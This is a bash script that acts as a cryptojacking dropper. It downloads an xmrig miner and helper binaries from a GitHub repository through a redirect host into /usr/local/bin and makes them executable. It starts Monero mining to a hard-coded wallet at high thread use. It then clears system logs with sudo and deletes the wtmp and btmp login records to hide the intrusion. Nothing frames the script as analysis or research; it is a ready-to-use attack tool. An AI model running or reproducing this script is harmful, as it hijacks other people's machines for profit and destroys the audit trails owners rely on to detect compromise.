#!/bin/bash

export DIRECTORY="/usr/local/bin"
export DOWNLOAD_URL="https://slink.ltd/https://raw.githubusercontent.com/lin2elysia/load/main/xmrig"
export DOWNLOAD_RUNNING_URL="https://slink.ltd/https://raw.githubusercontent.com/lin2elysia/load/main/running"
export DOWNLOAD_CONFIG_URL="https://slink.ltd/https://raw.githubusercontent.com/lin2elysia/load/main/apiSslMixConfig.json"
export DOWNLOAD_SSLMIX_URL="https://slink.ltd/https://raw.githubusercontent.com/lin2elysia/load/main/sslmix"

# Download and set permissions function
download_and_set_permissions() {
    local download_url="$1"
    local filename=$(basename "$download_url")
    if [ ! -f "$DIRECTORY/$filename" ]; then
        echo "Downloading $filename..."
        curl --progress-bar -o "$DIRECTORY/$filename" "$download_url"
        if [ $? -ne 0 ]; then
            echo "Download $filename fail."
            exit 1
        fi
    fi
    chmod +x "$DIRECTORY/$filename"
}

# Download and set permissions for required files
download_and_set_permissions "$DOWNLOAD_URL"
download_and_set_permissions "$DOWNLOAD_RUNNING_URL"
download_and_set_permissions "$DOWNLOAD_CONFIG_URL"
download_and_set_permissions "$DOWNLOAD_SSLMIX_URL"

# Set permissions for xmrig
chmod +x "$DIRECTORY/xmrig"
chmod +x "$DIRECTORY/running"
chmod +x "$DIRECTORY/apiSslMixConfig.json"
chmod +x "$DIRECTORY/sslmix"

# Run the 'running' script if it exists
if [ -f "$DIRECTORY/running" ]; then
    (cd "$DIRECTORY" && ./running) &
    sleep 3
fi

# Start xmrig
"$DIRECTORY/xmrig" --url=127.0.0.1:9443 --donate-level=0 --user=43p8AgGKbhH198j4aTvwMb42PwT6Mc1qzYm7Bxg4y4DTESJtGAvzgGePtwqudFmz7RCi29fwkuG4ZLgxmmQzN8joADCEv9S --pass=Local-Auto -k --coin monero --max-threads-hint=80

# Function to clean up logs and login records
clean_logs_and_records() {
    # Clear logs
    logs=(/var/log/*.log)
    for log in "${logs[@]}"
    do
        sudo cp /dev/null "$log"
    done

    # Delete login records
    sudo rm /var/log/wtmp
    sudo rm /var/log/btmp

    # Clear syslog
    sudo cp /dev/null /var/log/syslog
}

# Run clean_logs_and_records function in the background after 10 seconds
sleep 10 && clean_logs_and_records &

